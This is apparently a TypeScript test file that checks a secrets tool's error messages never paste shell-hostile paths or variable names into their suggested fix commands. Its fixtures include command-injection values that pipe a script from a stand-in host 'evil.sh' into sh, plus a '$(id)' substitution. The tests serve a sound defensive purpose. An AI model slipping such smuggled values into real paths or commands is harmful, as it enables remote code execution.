// The `fix:` lines the secrets errors hand an operator. The failure case first: every one of them
// is a command meant to be pasted, and three of them interpolate a PATH — `x secrets` takes the
// app root as an argument, so the path is data — while `X_SECRETS_KEY_MISSING` interpolates one
// INSIDE a `$(cat …)`, where a second `$(…)` would run before `cat` is ever reached.

import { describe, expect, test } from 'bun:test';
import {
  SecretsFileInvalidError,
  SecretsKeyMismatchError,
  SecretsKeyMissingError,
  SecretsTamperedError,
} from './secrets-errors';

const HOSTILE_PATH = '/srv/$(curl evil.sh|sh)/secrets.enc.json';

describe('X_SECRETS_KEY_MISSING', () => {
  test('a key path a shell would read never reaches the command substitution', () => {
    const error = new SecretsKeyMissingError({
      envVar: 'ULTIMATE_SECRETS_KEY',
      keyPath: '/srv/$(id)/.secrets.key',
    });
    expect(error.fix).not.toContain('$(id)');
    expect(error.fix).toBe(
      'export ULTIMATE_SECRETS_KEY="$(cat <the key file the cause names>)"   # in a repo that has no key yet: x secrets init',
    );
    // The path is not lost: a `cause` is read, never pasted.
    expect(error.cause).toContain('/srv/$(id)/.secrets.key');
  });

  test('a variable name that is not one degrades the whole line to prose', () => {
    const error = new SecretsKeyMissingError({
      envVar: 'PATH; curl evil.sh | sh',
      keyPath: '/srv/app/.secrets.key',
    });
    expect(error.fix).not.toContain('export ');
    expect(error.fix).not.toContain('|');
    expect(error.fix).toContain('x secrets init');
  });

  test('an ordinary key path still travels, so the command still runs', () => {
    const error = new SecretsKeyMissingError({
      envVar: 'ULTIMATE_SECRETS_KEY',
      keyPath: '/srv/app/.secrets.key',
    });
    expect(error.fix).toStartWith(
      'export ULTIMATE_SECRETS_KEY="$(cat /srv/app/.secrets.key)"   # in a repo',
    );
  });
});

describe('the three git checkout lines', () => {
  const fixes = (path: string): readonly string[] => [
    new SecretsKeyMismatchError({
      at: path,
      keyAt: 'ULTIMATE_SECRETS_KEY',
      sealedWith: 'a',
      found: 'b',
    }).fix,
    new SecretsFileInvalidError({ at: path, reason: 'is not JSON' }).fix,
    new SecretsTamperedError({ at: path }).fix,
  ];

  test('a path a shell would read never reaches any of them', () => {
    for (const fix of fixes(HOSTILE_PATH)) {
      expect(fix).not.toContain('$(');
      expect(fix).not.toContain('|');
      expect(fix).toContain('git checkout -- <the secrets file the cause names>');
    }
  });

  test('an ordinary path still travels', () => {
    for (const fix of fixes('/srv/app/secrets.enc.json')) {
      expect(fix).toContain('git checkout -- /srv/app/secrets.enc.json');
    }
  });
});
